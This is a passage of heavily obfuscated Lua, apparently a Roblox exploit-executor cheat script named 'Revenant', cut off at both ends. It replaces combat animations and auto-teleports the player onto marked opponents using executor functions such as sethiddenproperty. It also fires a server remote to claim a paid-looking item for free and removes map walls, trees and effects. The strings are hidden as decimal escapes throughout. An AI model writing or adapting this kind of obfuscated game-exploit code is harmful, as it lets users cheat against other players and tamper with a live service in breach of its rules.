 ) _IlllIIllII = _llIIIlIIll.CharacterAdded:Connect( function (newChar) _lIIIlIlIll = { UI = false, BR = false } task.wait(0x1) _IlllllIlII(newChar) end
 ) table.insert(_llIlllIlIl, function () local _IIllllIlII = _llIIIlIIll.Character if _IIllllIlII then _IIIIlIIIIl(_IIllllIlII, "\085\073") _IIIIlIIIIl(_IIllllIlII, "\066\082") end
 _lIIIlIlIll = { UI = false, BR = false } if _IlllIIllII then _IlllIIllII:Disconnect() _IlllIIllII = nil end
 pcall( function () _IlIllIIllI.AuraSelection:SetValue({}) end
 ) end
 ) end
 if _IlllIlIllI and _lIlIlIllIl.Misc and _lIlIlIIIII then local _llIIlIIIll = _lIlIlIIIII local _llIIIIIlll = { { trigger = "\049\048\052\054\056\054\054\053\057\057\049", _lIIIllIIII = "\078\111\114\109\097\108\032\080\117\110\099\104", key = "\078\080" }, { trigger = "\049\048\052\054\054\057\055\052\056\048\048", _lIIIllIIII = "\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115", key = "\067\080" }, { trigger = "\049\048\052\055\049\051\051\054\055\051\055", _lIIIllIIII = "\083\104\111\118\101", key = "\083\072" }, { trigger = "\049\050\053\049\048\049\055\048\057\056\056", _lIIIllIIII = "\085\112\112\101\114\099\117\116", key = "\085\067" }, } local _IIIllIlIII = { ["\078\080"] = { { _IlIIIIIlll = "\079\112\101\110", _IIIIllIIlI = "\049\056\057\048\051\054\052\050\056\053\051", timePos = 3.3, _lllIlllllI = nil, stopAfter = 0x1, stopFade = 0.2 }, { _IlIIIIIlll = "\075\105\099\107", _IIIIllIIlI = "\049\056\056\057\055\054\052\056\052\052\054", timePos = 3.1, _lllIlllllI = 1.5, stopAfter = nil }, { _IlIIIIIlll = "\080\111\105\110\116", _IIIIllIIlI = "\049\052\052\057\056\050\057\053\051\054\048", timePos = nil, _lllIlllllI = 0x2, stopAfter = 0x1, stopFade = 0.4 }, { _IlIIIIIlll = "\082\097\118\097\103\105\110\103\032\075\105\099\107", _IIIIllIIlI = "\049\054\057\052\053\053\053\048\048\050\057", timePos = 0x4, _lllIlllllI = 1.8, stopAfter = nil, speed2 = 1.2, speed2trigger = 5.1 }, { _IlIIIIIlll = "\083\116\114\101\110\103\116\104\110\101\115\115", _IIIIllIIlI = "\049\052\048\049\054\052\054\052\050\048\052\055\049\056\056", timePos = 6.9, _lllIlllllI = nil, stopAfter = 0.4, stopFade = 0.2, id2 = "\055\057\055\054\049\056\048\054\055\048\054\051\056\050", timePos2 = 0x3 }, { _IlIIIIIlll = "\071\111\100\039\115\032\070\101\097\114", _IIIIllIIlI = "\049\050\057\049\050\051\057\054\048\055\052\050\052\051\056", timePos = 11.48, _lllIlllllI = 1.5, stopAfter = nil, stopFade = 0.1 }, { _IlIIIIIlll = "\084\104\101\032\082\105\103\104\116\032\087\097\121", _IIIIllIIlI = "\049\050\053\050\054\053\052\053\057\056\056\054\056\054\051", timePos = 0x8, _lllIlllllI = 1.8, stopAfter = nil, stopFade = 0.2 }, }, ["\067\080"] = { { _IlIIIIIlll = "\066\108\117\101", _IIIIllIIlI = "\049\051\053\054\048\051\048\054\053\049\048", timePos = nil, _lllIlllllI = 2.7, stopAfter = nil }, { _IlIIIIIlll = "\066\097\114\114\097\103\101",_IIIIllIIlI = "\049\054\057\052\053\053\053\048\048\050\057", timePos = 0x2, _lllIlllllI = nil, stopAfter = nil, stopTrigger = 3.6, stopFade = 0.5 }, { _IlIIIIIlll = "\070\117\114\121", _IIIIllIIlI = "\049\050\050\055\051\049\056\056\055\053\052", timePos = nil, _lllIlllllI = 0x2, stopAfter = nil, cpLoop = true }, { _IlIIIIIlll = "\071\111\100\032\083\108\097\121\101\114", _IIIIllIIlI = "\049\050\057\049\050\051\057\054\048\055\052\050\052\051\056", timePos = 9.20, _lllIlllllI = nil, stopAfter = nil, stopTrigger = 10.8, stopFade = 0.1 }, { _IlIIIIIlll = "\070\105\115\115\105\111\110", _IIIIllIIlI = "\055\049\049\056\049\048\049\053\052\052\051\048\051\048", timePos = 4.9, _lllIlllllI = nil, stopAfter = nil, stopFade = 0.1 }, { _IlIIIIIlll = "\082\105\112\112\105\110\103\032\070\105\115\116", _IIIIllIIlI = "\049\050\053\050\054\053\052\053\057\056\056\054\056\054\051", timePos = 1.65, _lllIlllllI = 1.5, stopAfter = nil, stopTrigger = 4.25, stopFade = 0.2 }, { _IlIIIIIlll = "\070\105\110\105\115\104\105\110\039", _IIIIllIIlI = "\055\053\049\050\055\053\055\054\056\052\049\049\053\057", timePos = 1.1, _lllIlllllI = 0x2, stopAfter = nil, stopFade = 0.2 }, }, ["\083\072"] = { { _IlIIIIIlll = "\083\108\097\112", _IIIIllIIlI = "\049\056\052\052\048\051\056\057\057\051\048", timePos = 1.2, _lllIlllllI = nil, stopAfter = 0.6, stopFade = 0.4 }, { _IlIIIIIlll = "\075\105\099\107", _IIIIllIIlI = "\049\056\049\056\049\051\052\056\052\052\054", timePos = nil, _lllIlllllI = nil, stopAfter = nil }, { _IlIIIIIlll = "\086\097\110\105\115\104\105\110\103", _IIIIllIIlI = "\049\056\056\057\055\049\049\056\053\048\055", timePos = 2.2, _lllIlllllI = 0x1, stopAfter = nil, id2 = "\049\055\056\051\056\054\049\057\056\057\053", timePos2 = 0.45 }, { _IlIIIIIlll = "\083\119\101\101\112", randIds = { "\049\054\057\052\052\050\054\053\054\051\053", "\049\054\057\052\052\051\052\053\054\049\057" }, timePos = nil, _lllIlllllI = nil, stopAfter = nil }, { _IlIIIIIlll = "\082\097\103\101", _IIIIllIIlI = "\055\057\055\054\049\056\048\054\055\048\054\051\056\050", timePos = 2.7, _lllIlllllI = nil, stopAfter = nil }, { _IlIIIIIlll = "\082\101\118\101\114\115\101", _IIIIllIIlI = "\049\053\049\050\052\055\054\050\048\056\056", timePos = nil, _lllIlllllI = nil, stopAfter = nil }, }, ["\085\067"] = { { _IlIIIIIlll = "\078\101\099\107\032\068\101\115\116\114\111\121\101\114", _IIIIllIIlI = "\049\056\049\055\057\049\056\049\054\054\051", timePos = nil, _lllIlllllI = nil, stopAfter = nil }, { _IlIIIIIlll = "\084\104\114\111\119", _IIIIllIIlI = "\049\051\054\051\055\048\055\051\055\054\051\051\054\052\057", timePos = 0x1, _lllIlllllI = nil, stopAfter = 0x1, stopFade = 0.45 }, { _IlIIIIIlll = "\074\097\119\032\066\114\101\097\107\101\114", _IIIIllIIlI = "\057\055\051\052\055\052\052\051\053\057\055\057\052\055", timePos = 3.6, _lllIlllllI = 0.9, stopAfter = nil, stopFade = 0.1 }, }, } _llIIlIIIll:AddToggle("\067\117\115\116\111\109\083\097\105\116\097\109\097\069\110\097\098\108\101\100", { Text = "\069\110\097\098\108\101\032\067\117\115\116\111\109\032\083\097\105\116\097\109\097\032\065\110\105\109\115", Default = false, }) _llIIlIIIll:AddDivider() for _lllIlllIIl, _IIlIlIlIII in ipairs(_llIIIIIlll) do local _IIlIIIIIlI = _IIIllIlIII[_IIlIlIlIII.key] local _IIllIIllll = { "\068\101\102\097\117\108\116", "\082\097\110\100\111\109" } for _lllIlllIIl, _lIIIIIIIII in ipairs(_IIlIIIIIlI) do table.insert(_IIllIIllll, _lIIIIIIIII.name) end
 _llIIlIIIll:AddDropdown("\067\083\065\095" .. _IIlIlIlIII.key, { Text = _IIlIlIlIII.label, Values = _IIllIIllll, Default = 0x1, Multi = false, Searchable = false, }) if _IIlIlIlIII.key == "\067\080" then _llIIlIIIll:AddToggle("\078\111\066\097\114\114\097\103\101\065\114\109\115", { Text = "\082\101\109\111\118\101\032\066\097\114\114\097\103\101\032\065\114\109\115", Default = false, }) end
 end
 local _IlIIlIIIII = nil local _lIlIlIlIIl = nil local _llIIllIIlI = nil local _llIIllllll = nil local function _IIlllIIlll(_IIllllIlII) if _llIIllllll then _llIIllllll:Disconnect() _llIIllllll = nil end
 if not _IIllllIlII then return end
 _llIIllllll = _IIllllIlII.ChildAdded:Connect( function (_IIlIlIIIII) if not _IIlIlIIlIl.NoBarrageArms.Value then return end
 if _llIIIlIIll:GetAttribute("\067\104\097\114\097\099\116\101\114") ~= "\066\097\108\100" then return end
 if _IIlIlIIIII.Name ~= "\066\097\114\114\097\103\101\066\105\110\100" then return end
 pcall( function () _IIlIlIIIII:SetAttribute("\084\105\109\101\115", nil) end
 ) task.defer( function () pcall( function () _IIlIlIIIII:Destroy() end
 ) end
 ) end
 ) for _lllIlllIIl, _IIlIlIIIII in pairs(_IIllllIlII:GetChildren()) do if _IIlIlIIIII.Name == "\066\097\114\114\097\103\101\066\105\110\100" then if _llIIIlIIll:GetAttribute("\067\104\097\114\097\099\116\101\114") ~= "\066\097\108\100" then break end
 pcall( function () _IIlIlIIIII:SetAttribute("\084\105\109\101\115", nil) end
 ) task.defer( function () pcall( function () _IIlIlIIIII:Destroy() end
 ) end
 ) end
 end
 end
 local function _lIlIIIlllI(_IIllllIlII) local _IlllIllllI = nil local function _IIlIlIlIIl(obj) if obj:IsA("\066\111\100\121\086\101\108\111\099\105\116\121") then obj.Velocity = Vector3.new(obj.Velocity.X, 0x0, obj.Velocity.Z) end
 end
 _IlllIllllI = _IIllllIlII.DescendantAdded:Connect(_IIlIlIlIIl) for _lllIlllIIl, _IlIllllIII in pairs(_IIllllIlII:GetDescendants()) do _IIlIlIlIIl(_IlIllllIII) end
 return _IlllIllllI end
 local function _llllIIlllI(_IlIIIlIIII) if _IlIIlIIIII then _IlIIlIIIII:Disconnect() _IlIIlIIIII = nil end
 _llIIllIIlI = _IlIIIlIIII if not _IlIIIlIIII then return end
 _IlIIlIIIII = _IlIIIlIIII.AnimationPlayed:Connect( function (_llIIllIlIl) if not _IIlIlIIlIl.CustomSaitamaEnabled.Value then return end
 local _IlllIllIII = _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId or "" local _lIIlIIIIIl = _IlllIllIII:match("\037\100\043") if not _lIIlIIIIIl then return end
 local _IIlIlIlIII = nil for _lllIlllIIl, _llllIIIIIl in ipairs(_llIIIIIlll) do if _lIIlIIIIIl == _llllIIIIIl.trigger then _IIlIlIlIII = _llllIIIIIl break end
 end
 if not _IIlIlIlIII then return end
 local _llllIIIlIl = _IlIllIIllI["\067\083\065\095" .. _IIlIlIlIII.key] and _IlIllIIllI["\067\083\065\095" .. _IIlIlIlIII.key].Value or "\068\101\102\097\117\108\116" if _llllIIIlIl == "\068\101\102\097\117\108\116" then return end
 local _IIlIIIIIlI = _IIIllIlIII[_IIlIlIlIII.key] local _lIIIlIIllI = nil if _llllIIIlIl == "\082\097\110\100\111\109" then _lIIIlIIllI = _IIlIIIIIlI[math.random(0x1, #_IIlIIIIIlI)] else for _lllIlllIIl, _lIIIIIIIII in ipairs(_IIlIIIIIlI) do if _lIIIIIIIII.name == _llllIIIlIl then _lIIIlIIllI = _lIIIIIIIII break end
 end
 end
 if not _lIIIlIIllI then return end
 _llIIllIlIl:AdjustWeight(-0x98967F, 0x0) local _IIllllIlII = _llIIIlIIll.Character local _IIlllIIllI = (_IIllllIlII and _lIIIlIIllI.bv) and _lIlIIIlllI(_IIllllIlII) or nil local _IlllIllIII = _lIIIlIIllI.id if _lIIIlIIllI.randIds then _IlllIllIII = _lIIIlIIllI.randIds[math.random(0x1, #_lIIIlIIllI.randIds)] end
 local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IlllIllIII local _IIlIlIlIII = _IlIIIlIIII:LoadAnimation(_llllIlIllI) _IIlIlIlIII.Priority = Enum.AnimationPriority.Action3 _IIlIlIlIII:Play(0.1) if _lIIIlIIllI.speed then _IIlIlIlIII:AdjustSpeed(_lIIIlIIllI.speed) end
 if _lIIIlIIllI.timePos then _IIlIlIlIII.TimePosition = _lIIIlIIllI.timePos end
 _llIIllIlIl.Stopped:Connect( function () pcall( function () _IIlIlIlIII:Stop(_lIIIlIIllI.stopFade or 0.25) end
 ) end
 ) if _lIIIlIIllI.id2 then task.spawn( function () local function _llIIIlIlII() local _IIllIlIlll = Instance.new("\065\110\105\109\097\116\105\111\110") _IIllIlIlll.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _lIIIlIIllI.id2 local _lIllllllII = _IlIIIlIIII:LoadAnimation(_IIllIlIlll) _lIllllllII.Priority = Enum.AnimationPriority.Action3 _lIllllllII:Play(_lIIIlIIllI.stopFade or 0.1) if _lIIIlIIllI.timePos2 then _lIllllllII.TimePosition = _lIIIlIIllI.timePos2 end
 _lIllllllII.Stopped:Connect( function () if _IIlllIIllI then _IIlllIIllI:Disconnect() _IIlllIIllI = nil end
 end
 ) end
 if _lIIIlIIllI.stopAfter then task.wait(_lIIIlIIllI.stopAfter) if _IIlIlIlIII.IsPlaying then pcall( function () _IIlIlIlIII:Stop(_lIIIlIIllI.stopFade or 0x0) end
 ) end
 _llIIIlIlII() else repeat task.wait() until _IIlIlIlIII.TimePosition >= 2.25 or not _IIlIlIlIII.IsPlaying _IIlIlIlIII:Stop(0x0) _llIIIlIlII() end
 end
 ) else if _lIIIlIIllI.speed2 and _lIIIlIIllI.speed2trigger then task.spawn( function () repeat task.wait() until _IIlIlIlIII.TimePosition >= _lIIIlIIllI.speed2trigger or not _IIlIlIlIII.IsPlaying if _IIlIlIlIII.IsPlaying then _IIlIlIlIII:AdjustSpeed(_lIIIlIIllI.speed2) end
 end
 ) end
 if _lIIIlIIllI.stopTrigger then task.spawn( function () repeat task.wait() until _IIlIlIlIII.TimePosition >= _lIIIlIIllI.stopTrigger or not _IIlIlIlIII.IsPlaying pcall( function () _IIlIlIlIII:Stop(_lIIIlIIllI.stopFade or 0x0) end
 ) end
 ) elseif _lIIIlIIllI.stopAfter then task.delay(_lIIIlIIllI.stopAfter, function () pcall( function () _IIlIlIlIII:Stop(_lIIIlIIllI.stopFade or 0x1) end
 ) end
 ) end
 if _lIIIlIIllI.cpLoop then task.spawn( function () for _lllIlllIIl = 0x1, 0x4 do repeat task.wait() until _IIlIlIlIII.TimePosition >= 0.9 or not _IIlIlIlIII.IsPlaying if not _IIlIlIlIII.IsPlaying then break end
 _IIlIlIlIII.TimePosition = 0.6 end
 end
 ) end
 _IIlIlIlIII.Stopped:Connect( function () if _IIlllIIllI then _IIlllIIllI:Disconnect() _IIlllIIllI = nil end
 end
 ) end
 end
 ) end
 _lIlIlIlIIl = RunService.Heartbeat:Connect( function () local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII ~= _llIIllIIlI then _llllIIlllI(_IlIIIlIIII) _IIlllIIlll(_IIllllIlII) end
 end
 ) table.insert(_llIlllIlIl, function () if _IlIIlIIIII then _IlIIlIIIII:Disconnect() _IlIIlIIIII = nil end
 if _lIlIlIlIIl then _lIlIlIlIIl:Disconnect() _lIlIlIlIIl = nil end
 if _llIIllllll then _llIIllllll:Disconnect() _llIIllllll = nil end
 _llIIllIIlI = nil pcall( function () _IIlIlIIlIl.CustomSaitamaEnabled:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.NoBarrageArms:SetValue(false) end
 ) end
 ) end
 local _IIIlIlllII = false local _IIlIlllIll = false getgenv()._revenantDashCooldown = false getgenv()._revenantDashCooldownUntil = nil getgenv()._revenantTechActive = false getgenv()._wcDashOnCooldown = false getgenv()._revenantTechFiring = false local _IlIIIlIIIl = {} local function _lIllIllIIl(_IIllllIlII) for _lllIlllIIl, _IIIlIlllll in ipairs(_IlIIIlIIIl) do pcall( function () _IIIlIlllll:Disconnect() end
 ) end
 _IlIIIlIIIl = {} if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIIlIIII then return end
 local function _lIIllIlIll(_llIIllIlIl) if not _llIIllIlIl or not _llIIllIlIl.Animation then return end
 local _IIIIllIIlI = tostring(_llIIllIlIl.Animation.AnimationId or "") if _IIIIllIIlI:find("\049\048\052\055\057\051\051\053\051\057\055",0x1,true) or _IIIIllIIlI:find("\049\052\051\053\055\057\052\051\052\056\055",0x1,true) or _IIIIllIIlI:find("\049\051\051\056\048\050\053\053\055\053\049",0x1,true) or _IIIIllIIlI:find("\049\048\052\057\049\057\057\051\054\056\050",0x1,true) then _IIIlIlllII = true _IIlIlllIll = true getgenv()._wcDashOnCooldown = true task.delay(0x6, function () _IIIlIlllII = false _IIlIlllIll = false getgenv()._wcDashOnCooldown = false end
 ) end
 end
 table.insert(_IlIIIlIIIl, _IlIIIlIIII.AnimationPlayed:Connect(_lIIllIlIll)) local _IIIIlIIllI = _IlIIIlIIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _IIIIlIIllI then table.insert(_IlIIIlIIIl, _IIIIlIIllI.AnimationPlayed:Connect(_lIIllIlIll)) end
 end
 task.spawn( function () _lIllIllIIl(_llIIIlIIll.Character) end
 ) _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) task.spawn( function () task.wait(0.1) _lIllIllIIl(_IIllllIlII) end
 ) end
 ) table.insert(_llIlllIlIl, function () for _lllIlllIIl, _IIIlIlllll in ipairs(_IlIIIlIIIl) do pcall( function () _IIIlIlllll:Disconnect() end
 ) end
 _IlIIIlIIIl = {} _IIIlIlllII = false _IIlIlllIll = false getgenv()._revenantDashCooldown = false getgenv()._revenantDashCooldownUntil = nil end
 ) do local _IIIIllIlII = false local _lIlIIlIlll = nil local _IIIIllllIl = nil local _IIIlllIlIl = "\049\048\055\052\056\052\051\051\057\052\057\053\056\049\049" local function _llllIIlIll() local _IIIIllIIlI = {} local _lIllIIlIll = workspace:FindFirstChild("\076\105\118\101") if not _lIllIIlIll then return _IIIIllIIlI end
 local _lIIllIIllI = _llIIIlIIll.Character for _lllIlllIIl, _IlIIllIlll in pairs(_lIllIIlIll:GetChildren()) do if _IlIIllIlll ~= _lIIllIIllI and _IlIIllIlll:FindFirstChild("\079\107") then table.insert(_IIIIllIIlI, _IlIIllIlll) end
 end
 return _IIIIllIIlI end
 _IlIIIIIIIl:AddToggle("\065\117\116\111\071\111\100\115\108\097\121\101\114\084\080", { Text = "\065\117\116\111\032\067\111\115\109\105\099\032\071\097\114\111\117", Tooltip = "\073\102\032\121\111\117\032\109\097\114\107\032\115\111\109\101\111\110\101\032\117\115\105\110\103\032\072\117\110\116\101\114\115\032\077\097\114\107\032\097\110\100\032\117\115\101\032\071\111\100\115\108\097\121\101\114\032\116\104\105\115\032\119\105\108\108\032\097\117\116\111\109\097\116\105\099\097\108\108\121\032\116\101\108\101\112\111\114\116\032\116\111\032\115\111\109\101\111\110\101\032\116\104\097\116\032\105\115\032\109\097\114\107\101\100", Default = false, Callback = function (_lIllIlIIll) _IIIIllIlII = _lIllIlIIll if _lIllIlIIll then if _lIlIIlIlll then _lIlIIlIlll:Disconnect() end
 _lIlIIlIlll = RunService.Heartbeat:Connect( function () local _IIIlIlllll = _llIIIlIIll.Character if not _IIIlIlllll then return end
 if _IIIlIlllll:GetAttribute("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then return end
 local _IlIIIlIIII = _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIIlIIII or _IlIIIlIIII.Health <= 0x0 then return end
 local _IIIIlIIllI = _IlIIIlIIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIIIlIIllI then return end
 for _lllIlllIIl, _llIIllIlIl in pairs(_IIIIlIIllI:GetPlayingAnimationTracks()) do if _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId:match(_IIIlllIlIl) and _llIIllIlIl.TimePosition >= 0.30 then local _lIllIIlIll = workspace:FindFirstChild("\076\105\118\101") local _IIIlllIIll = false if _IIIIllllIl and _lIllIIlIll then _IIIlllIIll = _IIIIllllIl.Parent == _lIllIIlIll and _IIIIllllIl:FindFirstChild("\079\107") ~= nil end
 if not _IIIlllIIll then local _IIIIllIIlI = _llllIIlIll() _IIIIllllIl = #_IIIIllIIlI > 0x0 and _IIIIllIIlI[0x1] or nil end
 if not _IIIIllllIl then return end
 local _IIIIllIIIl = _IIIIllllIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIIllIIIl then local _lIIllllIIl = _IIIIllIIIl.CFrame * CFrame.new(0x0, 0x0, 0x2) local _IlIIIIIIll = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _llIllllllI and _IlIIIIIIll then _IlIIIIIIll.CFrame = _lIIllllIIl _IlIIIIIIll.AssemblyLinearVelocity = Vector3.zero _IlIIIIIIll.AssemblyAngularVelocity = Vector3.zero pcall( function () sethiddenproperty(_IlIIIIIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIIllIIIl) end
 ) RunService.Heartbeat:Once( function () pcall( function () sethiddenproperty(_IlIIIIIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 ) else RunService.Heartbeat:Once( function () RunService.Heartbeat:Once( function () local _IIlIIIlIlI = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIlIIIlIlI then _IIlIIIlIlI.CFrame = _lIIllllIIl end
 end
 ) end
 ) end
 end
 return end
 end
 end
 ) else if _lIlIIlIlll then _lIlIIlIlll:Disconnect() _lIlIIlIlll = nil end
 _IIIIllllIl = nil end
 end
 , }) table.insert(_llIlllIlIl, function () _IIIIllIlII = false _IIIIllllIl = nil if _lIlIIlIlll then _lIlIIlIlll:Disconnect() _lIlIIlIlll = nil end
 pcall( function () _IIlIlIIlIl.AutoGodslayerTP:SetValue(false) end
 ) end
 ) end
 if _IlllIlIllI then _IlIIIIIIIl:AddButton({ Text = "\070\114\101\101\032\083\116\097\114\103\097\122\101\114\032\047\032\078\105\103\104\116\099\104\105\108\100", Func = function () local _IIllllIlII = _llIIIlIIll.Character local _llIIlllIll = _IIllllIlII and _IIllllIlII:FindFirstChild("\067\111\109\109\117\110\105\099\097\116\101") if _llIIlllIll then _llIIlllIll:FireServer({ Goal = "\071\097\122\101" }) end
 end
 , }) end
 end
 , tostring) if not _lllIlIlIll then warn("\091\082\101\118\101\110\097\110\116\032\070\069\065\084\085\082\069\083\032\069\082\082\079\082\093\058\032" .. tostring(_featErr)) end
 do local function _IlIlIlIllI(optKey, togKey) local _IllllIlIIl = _IIlIlIIlIl[togKey] if not _IllllIlIIl then return end
 local function _IIIIllIllI(_lIllIlIIll) local _llllIIIlIl = _IlIllIIllI[optKey] if _llllIIIlIl and type(_llllIIIlIl.KeybindsToggle) == "\116\097\098\108\101" then _llllIIIlIl.KeybindsToggle:SetVisibility(_lIllIlIIll == true) end
 end
 _IIIIllIllI(_IllllIlIIl.Value) _IllllIlIIl:OnChanged(_IIIIllIllI) end
 _IlIlIlIllI("\082\101\118\101\110\097\110\116\070\108\121\066\105\110\100", "\082\101\118\101\110\097\110\116\070\108\121") _IlIlIlIllI("\065\110\105\109\101\084\080\075\101\121\098\105\110\100", "\065\110\105\109\101\084\101\108\101\112\111\114\116\097\116\105\111\110") _IlIlIlIllI("\076\045\079\110\075\101\121\098\105\110\100", "\076\111\099\107\045\111\110") _IlIlIlIllI("\075\080\073\110\118\105\115", "\084\111\103\073\110\118\105\115") _IlIlIlIllI("\075\080\072\101\097\100\070\108\111\097\116", "\084\111\103\072\101\097\100\070\108\111\097\116") _IlIlIlIllI("\075\080\074\101\114\107", "\084\111\103\074\101\114\107") _IlIlIlIllI("\075\080\066\097\110\103", "\084\111\103\066\097\110\103") _IlIlIlIllI("\075\080\084\080\111\115\101", "\084\111\103\084\080\111\115\101") _IlIlIlIllI("\075\080\070\085\067", "\084\111\103\070\085\067") _IlIlIlIllI("\084\111\117\099\104\070\108\105\110\103\066\105\110\100", "\084\111\117\099\104\070\108\105\110\103\069\110\097\098\108\101\100") _IlIlIlIllI("\075\080\087\101\108\100", "\084\111\103\087\101\108\100") end
 _IIIllIIIIl:LoadAutoloadConfig() if getgenv()._disguiseAutoApply then getgenv()._disguiseAutoApply() end
 end
 ) if _IllIlllllI[_lIIIlIIllI] then local _llIIlIlIII = Instance.new("\070\111\108\100\101\114") _llIIlIlIII.Name = "\082\101\109\111\118\101\100\084\114\101\101\115" _llIIlIlIII.Parent = game:GetService("\067\111\114\101\071\117\105") local _llllIIIlII = Instance.new("\070\111\108\100\101\114") _llllIIIlII.Name = "\082\101\109\111\118\101\100\087\097\108\108\115" _llllIIIlII.Parent = game:GetService("\067\111\114\101\071\117\105") local _IIIlIIllII = game:GetService("\076\105\103\104\116\105\110\103") _IIllIlIIlI:AddToggle("\078\111\087\097\108\108\115", { Text = "\078\111\032\087\097\108\108\115", Default = false, Callback = function (_lIllIlIIll) local _lIlIllIIll = workspace:FindFirstChild("\077\097\112") if not _lIlIllIIll then return end
 if _lIllIlIIll then for _lllIlllIIl, _IIlIlIIIII in pairs(_lIlIllIIll:GetChildren()) do if table.find({"\087\097\108\108\115","\071\114\097\115\115\084\111\112","\084\117\110\110\101\108","\080\097\114\116"}, _IIlIlIIIII.Name) then _IIlIlIIIII.Parent = _llllIIIlII end
 end
 else for _lllIlllIIl, _IIlIlIIIII in pairs(_llllIIIlII:GetChildren()) do _IIlIlIIIII.Parent = workspace.Map end
 end
 end
 , }) _IIllIlIIlI:AddToggle("\078\111\084\114\101\101\115", { Text = "\078\111\032\084\114\101\101\115", Default = false, Callback = function (_lIllIlIIll) local _lIIllIlllI = workspace:FindFirstChild("\077\097\112") and workspace.Map:FindFirstChild("\084\114\101\101\115") if not _lIIllIlllI then return end
 if _lIllIlIIll then for _lllIlllIIl, _IIlIlIIIII in pairs(_lIIllIlllI:GetChildren()) do _IIlIlIIIII.Parent = _llIIlIlIII end
 else for _lllIlllIIl, _IIlIlIIIII in pairs(_llIIlIlIII:GetChildren()) do _IIlIlIIIII.Parent = workspace.Map.Trees end
 end
 end
 , }) if workspace:FindFirstChild("\077\097\112") and workspace.Map:FindFirstChild("\084\114\101\101\115") then workspace.Map.Trees.ChildAdded:Connect( function (p738) if _IIlIlIIlIl.NoTrees.Value then RunService.RenderStepped:Wait() p738.Parent = _llIIlIlIII end
 end
 ) end
 local function _IllllIllll(inst, newInstance) task.wait() local _lIIlIllIlI = inst.Parent inst:Destroy() if newInstance then warn("\073\110\115\116\097\110\099\101\032\114\101\109\111\118\101\100\044\032\078\097\109\101\058", inst.Name, "\067\108\097\115\115\078\097\109\101\058", inst.ClassName, "\080\097\114\101\110\116\058", _lIIlIllIlI) end
 end
 _IIllIlIIlI:AddToggle("\078\111\068\101\098\114\105\115", { Text = "\078\111\032\068\101\098\114\105\115", Default = false, Callback = function (_lIllIlIIll) if _lIllIlIIll then local _IIlllllIIl = workspace:FindFirstChild("\084\104\114\111\119\110") if _IIlllllIIl then for _lllIlllIIl, _IIlIlIIIII in pairs(_IIlllllIIl:GetChildren()) do if _IIlIlIIIII.Name:lower():find("\100\101\098\114\105\115") or _IIlIlIIIII.Name:lower() == "\112\097\114\116" then task.spawn(pcall, _IllllIllll, _IIlIlIIIII) end
 end
 end
 end
 end
 , }) _IIllIlIIlI:AddToggle("\078\111\083\109\111\107\101", { Text = "\078\111\032\083\109\111\107\101", Default = false, Callback = function (_lIllIlIIll) if _lIllIlIIll then local _IIlllllIIl = workspace:FindFirstChild("\084\104\114\111\119\110") if _IIlllllIIl then for _lllIlllIIl, _IIlIlIIIII in pairs(_IIlllllIIl:GetChildren()) do if _IIlIlIIIII.Name:lower():find("\115\109\111\107\101") then task.spawn(pcall, _IllllIllll, _IIlIlIIIII) end
 end
 end
 end
 end
 , }) _IIllIlIIlI:AddToggle("\078\111\069\120\112\108\111\115\105\111\110\115", { Text = "\078\111\032\069\120\112\108\111\115\105\111\110\115", Default = false, Callback = function (_lIllIlIIll) if _lIllIlIIll then local _IIlllllIIl = workspace:FindFirstChild("\084\104\114\111\119\110") if _IIlllllIIl then for _lllIlllIIl, _IIlIlIIIII in pairs(_IIlllllIIl:GetChildren()) do if _IIlIlIIIII.Name:lower():find("\101\120\112\108\111") then task.spawn(pcall, _IllllIllll, _IIlIlIIIII) end
 end
 end
 end
 end
 , }) workspace.ChildAdded:Connect( function (_IIlIlIIIII) if _IIlIlIIIII.Name:lower() == "\097\100\106\117\115\116\101\100\104\098" and rawget(_IlIllIIllI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\083\116\111\110\101\032\071\114\097\118\101") then task.spawn(pcall, _IllllIllll, _IIlIlIIIII, false) end
 end
 ) local function _llIIllIlll(_IIlllllIIl) _IIlllllIIl.ChildAdded:Connect( function (_IIlIlIIIII) if (_IIlIlIIIII.Name:lower():find("\100\101\098\114\105\115") or _IIlIlIIIII.Name:lower() == "\112\097\114\116") and _IIlIlIIlIl.NoDebris.Value then task.spawn(pcall, _IllllIllll, _IIlIlIIIII, false) elseif _IIlIlIIIII.Name:lower():find("\116\114\101\101") and _IIlIlIIlIl.NoTrees.Value then task.spawn(pcall, _IllllIllll, _IIlIlIIIII, false) elseif _IIlIlIIIII.Name:lower():find("\115\109\111\107\101") and _IIlIlIIlIl.NoSmoke.Value then task.spawn(pcall, _IllllIllll, _IIlIlIIIII, false) elseif _IIlIlIIIII.Name:lower():find("\101\120\112\108\111") and _IIlIlIIlIl.NoExplosions.Value then task.spawn(pcall, _IllllIllll, _IIlIlIIIII, false) elseif table.find({"\098\101\097\109\101\100","\097\100\106\117\115\116\101\100"}, _IIlIlIIIII.Name:lower()) then 